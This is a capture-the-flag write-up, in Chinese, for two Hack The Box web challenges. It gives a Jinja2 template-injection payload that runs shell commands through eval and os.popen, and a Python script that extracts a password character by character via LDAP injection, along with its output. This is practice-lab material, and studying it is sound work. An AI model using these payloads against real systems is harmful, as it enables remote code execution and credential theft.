[https://app.hackthebox.com/challenges](https://app.hackthebox.com/challenges)

>Web部分

# Templated

[https://app.hackthebox.com/challenges/templated](https://app.hackthebox.com/challenges/templated)

模板注入

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271459182.png)

`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag.txt').read()") }}{% endif %}{% endfor %}`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271508165.png)

# Phonebook

[https://app.hackthebox.com/challenges/153](https://app.hackthebox.com/challenges/153)

主页为登录框,`964430b4cdd199af19b986eaf2193b21f32542d0/`中有一个搜索框,但是会返回`Access denied`,推测需要登录才能进行搜索

登录框在传入`\`或者`)`会返回`500`错误,推测存在sql注入,但是sqlmap跑不出来,推测不是常规的注入方式...

用SecLists里面的Fuzzing文件夹中的字典去进行测试,使用`*`作为用户名和密码时成功登录,因此可以推测其为ldap注入

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203271621629.png)

[从HTB靶机中浅谈LDAP注入攻击](https://ca01h.top/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/)

[从一次漏洞挖掘入门Ldap注入](https://xz.aliyun.com/t/5689)

登录进去之后利用搜索框进行搜索,但是没有找到flag

尝试利用ldap注入在登录框处爆破密码

```python
import requests
url="http://46.101.61.42:30525/login"
char='''QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890-=[]';,./!@#$%^&()_+}{":>?<\|'''
proxies={'http':'http://127.0.0.1:7890'}
flag="HTB{"

while True:
    for i in char:
        payload={'username':'*','password':flag+i+'*'}
        r=requests.post(url=url,data=payload,proxies=proxies,allow_redirects=False)
        if r.status_code==500:
            continue
        try:
            if r.headers['Location']=='/':
                flag+=i
                print(flag)
                if i=='}':
                    exit(0)
                break
        except KeyError:
            continue
```

```
HTB{d
HTB{d1
HTB{d1r
HTB{d1re
HTB{d1rec
HTB{d1rect
HTB{d1recto
HTB{d1rector
HTB{d1rectory
HTB{d1rectory_
HTB{d1rectory_h
HTB{d1rectory_h4
HTB{d1rectory_h4x
HTB{d1rectory_h4xx
HTB{d1rectory_h4xx0
HTB{d1rectory_h4xx0r
HTB{d1rectory_h4xx0r_
HTB{d1rectory_h4xx0r_i
HTB{d1rectory_h4xx0r_is
HTB{d1rectory_h4xx0r_is_
HTB{d1rectory_h4xx0r_is_k
HTB{d1rectory_h4xx0r_is_k0
HTB{d1rectory_h4xx0r_is_k00
HTB{d1rectory_h4xx0r_is_k00l
HTB{d1rectory_h4xx0r_is_k00l}
```